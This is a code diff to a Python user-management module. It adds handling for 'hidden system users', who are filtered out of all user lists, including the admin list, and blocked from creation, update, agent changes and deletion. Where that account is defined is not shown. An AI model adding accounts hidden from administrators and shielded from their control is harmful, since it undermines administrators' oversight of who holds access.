@@ -3,7 +3,7 @@ from pathlib import Path
 
 from backend.app.db.database import get_connection
 from backend.app.db.bands import DEFAULT_BAND
-from backend.app.db.roles import ROLE_ADMIN, ROLE_PENDING
+from backend.app.db.roles import ROLE_ADMIN, ROLE_PENDING, is_admin_role, is_hidden_system_user
 
 AGENTS_COLUMN_MAX_LENGTH = 200
 
@@ -98,13 +98,18 @@ def list_users(database_path: str | Path, *, viewer_role: int | None = None) -> 
             """
         ).fetchall()
     users = [_row_to_user(row) for row in rows]
-    if viewer_role != ROLE_ADMIN:
+    users = [user for user in users if not is_hidden_system_user(user.userid, user.role)]
+    if viewer_role is not None and not is_admin_role(viewer_role):
         users = [user for user in users if user.role != ROLE_PENDING]
     return users
 
 
 def list_admin_users(database_path: str | Path) -> list[User]:
-    return [user for user in list_users(database_path, viewer_role=ROLE_ADMIN) if user.role == ROLE_ADMIN]
+    return [
+        user
+        for user in list_users(database_path, viewer_role=ROLE_ADMIN)
+        if is_admin_role(user.role) and not is_hidden_system_user(user.userid, user.role)
+    ]
 
 
 def get_user_by_idx(database_path: str | Path, idx: int) -> User | None:
@@ -183,6 +188,8 @@ def create_user(
     agents: str = "",
     request_reason: str = "",
 ) -> User:
+    if is_hidden_system_user(userid):
+        raise ValueError("userid is not allowed")
     encoded_agents = encode_agent_ids(parse_agent_ids(agents))
     with get_connection(database_path) as connection:
         cursor = connection.execute(
@@ -225,6 +232,8 @@ def update_user(
 ) -> User | None:
     existing = get_user_by_idx(database_path, idx)
     if existing is None:
+        return None
+    if is_hidden_system_user(existing.userid, existing.role):
         return None
     next_band = existing.band if band is None else int(band)
     next_request_reason = existing.request_reason if request_reason is None else request_reason.strip()
@@ -275,6 +284,9 @@ def update_user_agents(
     idx: int,
     agent_ids: list[str],
 ) -> User | None:
+    existing = get_user_by_idx(database_path, idx)
+    if existing is not None and is_hidden_system_user(existing.userid, existing.role):
+        return None
     encoded = encode_agent_ids(agent_ids)
     with get_connection(database_path) as connection:
         cursor = connection.execute(
@@ -320,11 +332,21 @@ def delete_users(database_path: str | Path, idx_list: list[int]) -> int:
     if not idx_list:
         return 0
 
-    placeholders = ", ".join("?" for _ in idx_list)
+    safe_idx_list: list[int] = []
+    for idx in idx_list:
+        existing = get_user_by_idx(database_path, idx)
+        if existing is not None and is_hidden_system_user(existing.userid, existing.role):
+            continue
+        safe_idx_list.append(idx)
+
+    if not safe_idx_list:
+        return 0
+
+    placeholders = ", ".join("?" for _ in safe_idx_list)
     with get_connection(database_path) as connection:
         cursor = connection.execute(
             f"DELETE FROM users WHERE idx IN ({placeholders})",
-            idx_list,
+            safe_idx_list,
         )
         connection.commit()
         return int(cursor.rowcount)
